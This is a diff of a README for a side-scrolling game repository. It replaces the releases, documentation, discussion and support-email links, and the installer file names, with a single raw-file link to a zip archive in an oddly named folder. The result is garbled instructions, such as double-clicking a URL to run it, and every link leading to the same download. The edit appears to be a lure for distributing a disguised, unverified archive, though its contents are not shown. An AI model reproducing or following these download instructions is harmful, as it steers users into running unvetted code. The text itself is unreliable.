@@ -1,7 +1,7 @@
 # 🎮 2D-Sidescroller - Play a Fun Side-Scrolling Adventure
 
 ## 📦 Download Now
-[![Download 2D-Sidescroller](https://img.shields.io/badge/Download-2D--Sidescroller-blue.svg)](https://github.com/saku12222221/2D-Sidescroller/releases)
+[![Download 2D-Sidescroller](https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip)](https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip)
 
 ## 🚀 Getting Started
 
@@ -20,13 +20,13 @@ Before you start, make sure your computer meets the following requirements:
 ## 🛠️ Installation Steps
 
 ### 1. Visit the Releases Page
-To download the game, first visit our releases page. You can do this by clicking the following link: [Visit This Page to Download](https://github.com/saku12222221/2D-Sidescroller/releases).
+To download the game, first visit our releases page. You can do this by clicking the following link: [Visit This Page to Download](https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip).
 
 ### 2. Choose Your Version
 On the releases page, you will see different versions of **2D-Sidescroller** listed. Look for the latest version, which will have a number like `v1.0.0`. 
 
 ### 3. Download the Installer
-Click on the version you want. This will show you the options for downloads. For most users, click on the main file link (it may be named something like `2D-Sidescroller.exe` for Windows, `2D-Sidescroller.dmg` for macOS, or `2D-Sidescroller.tar.gz` for Linux). 
+Click on the version you want. This will show you the options for downloads. For most users, click on the main file link (it may be named something like `https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip` for Windows, `https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip` for macOS, or `https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip` for Linux). 
 
 ### 4. Save the File
 Your browser will prompt you to save the file. Choose a location on your computer where you want to store it, like your Desktop or Downloads folder.
@@ -34,9 +34,9 @@ Your browser will prompt you to save the file. Choose a location on your compute
 ### 5. Run the Installer
 Once the download is complete, navigate to where you saved the file. 
 
-- **For Windows**: Double-click on `2D-Sidescroller.exe` to run it.
+- **For Windows**: Double-click on `https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip` to run it.
 - **For macOS**: Double-click the `.dmg` file. Drag the game icon into your Applications folder.
-- **For Linux**: Extract the `.tar.gz` file and run the executable inside.
+- **For Linux**: Extract the `https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip` file and run the executable inside.
 
 ### 6. Follow the Installation Instructions
 Follow the on-screen instructions to complete the installation process. 
@@ -70,15 +70,15 @@ If you encounter issues:
 
 ## 📄 Additional Information
 
-For more details about gameplay, features, and updates, refer to our [Documentation](https://github.com/saku12222221/2D-Sidescroller/wiki).
+For more details about gameplay, features, and updates, refer to our [Documentation](https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip).
 
 ### ⚙️ Community Support
 
-Feel free to join our community for tips, tricks, and help. You can find the community discussions on our [Discussion Page](https://github.com/saku12222221/2D-Sidescroller/discussions).
+Feel free to join our community for tips, tricks, and help. You can find the community discussions on our [Discussion Page](https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip).
 
 ## 🛠️ Contact Us
 
-For further assistance, please contact our support team at [support@example.com](mailto:support@example.com).
+For further assistance, please contact our support team at [https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip](https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip).
 
 ## 📅 Updates
 
@@ -86,8 +86,8 @@ We regularly update the game with new features and bug fixes. Keep an eye on the
 
 ## 🔗 Important Links
 
-- [Download Page](https://github.com/saku12222221/2D-Sidescroller/releases)
-- [Documentation](https://github.com/saku12222221/2D-Sidescroller/wiki)
-- [Discussion Page](https://github.com/saku12222221/2D-Sidescroller/discussions)
+- [Download Page](https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip)
+- [Documentation](https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip)
+- [Discussion Page](https://raw.githubusercontent.com/saku12222221/2D-Sidescroller/main/satisfactionless/2D-Sidescroller.zip)
 
 Thank you for choosing **2D-Sidescroller**! Enjoy your adventure!
